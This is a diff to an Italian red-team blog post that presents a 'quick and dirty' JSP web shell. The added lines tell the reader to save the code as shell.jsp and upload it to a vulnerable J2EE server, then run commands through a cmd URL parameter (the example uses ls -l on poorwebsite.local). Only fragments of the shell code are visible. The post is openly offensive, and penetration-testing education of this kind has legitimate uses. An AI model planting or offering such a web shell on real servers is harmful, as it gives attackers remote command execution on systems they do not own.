@@ -4,9 +4,9 @@ title: "Una shell, datemi una shell"
 tags: [java, jsp, shell, web shell, shell, attacker, redteam]
 level: basic
 image:
-  feature:
-  credit:
-  creditlink:
+  feature: shell.jpg
+  credit: Jorge Brazil
+  creditlink: https://flic.kr/p/qB328z
 comments: true
 share: true
 order: 1
@@ -19,6 +19,8 @@ di codice Java su un J2EE container.
 Che sia grazie ad un metodo PUT, che sia perché l'applicazione web ha è bucata
 come il groviera, vuoi una shell da buttare su al volo, qualcosa di veramente
 _quick and dirty_.
+
+Salva questo file come shell.jsp e caricalo sul web server.
 
 {% highlight java %}
 <%@ page import="java.util.*,java.io.*"%>
@@ -54,4 +56,12 @@ if (request.getParameter("cmd") != null) {
 %>
 </pre>
 </BODY></HTML>
+{% endhighlight %}
+
+A questo punto ti basterà richiamare, l'url dell'applicazione vulnerabile più
+l'eventuale percorso dove hai fatto l'upload del file, più shell.jsp, passando
+come parametro il comando da eseguire:
+
+{% highlight sh%}
+http://poorwebsite.local/shell.jsp?cmd=ls%20-l
 {% endhighlight %}
